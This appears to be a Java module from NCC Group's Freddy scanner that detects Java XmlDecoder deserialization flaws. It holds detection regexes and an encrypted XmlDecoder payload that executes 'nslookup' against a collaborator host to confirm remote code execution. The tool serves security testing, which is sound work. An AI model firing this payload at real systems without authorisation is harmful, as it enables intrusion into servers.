// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.java;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

import java.util.regex.Pattern;

/***********************************************************
 * Module targeting the Java XmlDecoder API.
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class XmlDecoderModule extends FreddyModuleBase {
    //Collaborator payload name
    private static final String PN_XMLDECODER = "XmlDecoder";

    //XmlDecoder payload data
    private final String XMLDEC_PREFIX = decrypt("21ECI++gRLWho4/vDf63W5LrlbqTcjOyX0fNN3fjiwRSLyS5d9pN5YK7jSqDviSoYdYZENMOeZViSduKieWqs3spsvWY/y2L3N1HfCCrWfUwEp2W7TWfipY9Zq8f7ljqNDNDp5uSIRP/jaftuOCWlYUtA9Gdk4fVVF09/PiV7Uq2myAZ/J2bVexrQxyExx8O");
    private final String XMLDEC_SUFFIX = decrypt("QPbawrPgIp8lz93PVVw8wkbEXRK1tJ+z0mm57BvqKZVuzTmICoUfhAcGYZL+mNL1");

    protected void initialiseModule() {
        setName("XmlDecoder");
        setPlatform(TargetPlatform.JAVA);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("");
        setRemediationDetail("");
        setSeverity(SeverityRating.HIGH);

        //Register passive/active scan payloads
        registerPassiveScanIndicator(new Pattern[]{Pattern.compile("((<)|(%3C)|(%3c))java"), Pattern.compile("version((=)|(%3D)|(%3d))"), Pattern.compile("class((=)|(%3D)|(%3d))")}, IndicatorTarget.REQUEST);
        registerPassiveScanIndicator(new Pattern[]{Pattern.compile("exception", Pattern.CASE_INSENSITIVE), Pattern.compile("java\\.beans\\.XMLDecoder\\.readObject")}, IndicatorTarget.RESPONSE);

        registerActiveScanExceptionPayload("<object class=\"FreddyDeser\"/>", "java.lang.ArrayIndexOutOfBoundsException: 0");

        registerActiveScanCollaboratorPayload(PN_XMLDECODER, false);
    }

    protected String generateCollaboratorTextPayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_XMLDECODER:
                return XMLDEC_PREFIX + "<string>nslookup</string><string>" + hostname + "</string>" + XMLDEC_SUFFIX;
        }
        return null;
    }
}
